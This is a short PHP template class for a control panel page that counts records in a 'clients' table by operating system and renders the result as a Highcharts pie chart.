<?php
	/* Copyright © 2012 by Chrystal */
	
	if(!defined('__CP__')) { die(); }
	
	class Template_SystemStatistic
	{
		private $Content = NULL;
		private $Title = 'System Statistic';
		
		public function __construct()
		{
			$this->CreateGraph();
			$this->Content .= ('<center><blockquote><div id="container" style="width: 800px; height: 400px; margin: 0 auto;"></div></blockquote></center>');
		}
		
		private function CreateGraph()
		{
			global $Base;
			global $DB;
			
			$Result = $DB->Query("SELECT System, COUNT(*) as Count FROM clients GROUP BY System ORDER BY Count DESC;"); 
			$Clients = $DB->GetRow($DB->Query("SELECT COUNT(*) as Count FROM clients;"));
			
			while($Data = $DB->GetRow($Result))
				$Values[] = array($Data['System'], (intval($Data['Count']) / (intval($Clients['Count']) * 100)));
			
			$Index = ((count($Values) - 1) > 0 ? 1 : 0);
			$Values[$Index] = array('name' => $Values[$Index][0], 'y' => $Values[$Index][1], 'sliced' => true, 'selected' => true);
			
			$this->Content .= ("<script type='text/javascript'>
									var chart;
									var num = '" . $Clients['Count'] . "';
									
									$(document).ready(function() {
										chart = new Highcharts.Chart({										
											chart: {
												renderTo: 'container',
												plotBackgroundColor: null,
												plotBorderWidth: null,
												plotShadow: false
											},
											title: {
												text: 'System Statistic'
											},
											tooltip: {
												formatter: function() {
													if (num > 0)
													{
														return '<b>'+ this.point.name +'</b>: '+ Math.round(parseFloat(this.percentage) / 100 * num) +' / '+ num +' Clients';
													} else { return '<b>No Clients could be found</b>'; }
												}
											},
											plotOptions: {
												pie: {
													allowPointSelect: true,
													cursor: 'pointer',
													dataLabels: {
														enabled: true,
														color: '#000000',
														connectorColor: '#000000',
														formatter: function() {
															return '<b>'+ this.point.name +'</b>: '+ parseFloat(new Number(this.percentage+'').toFixed(parseInt(3))) +' %';
														}
													}
												}
											},
											series: [{
												type: 'pie',
												data: [" . ($Clients['Count'] > 0 ? substr(json_encode($Values), 1, -1) : "['No Data could be collected yet', 100]") . "]
											}]
										});
									});
								</script>");
		}
		
		public function GetContent()
		{
			return $this->Content;
		}
		
		public function GetTitle()
		{
			return $this->Title;
		}
	}
?>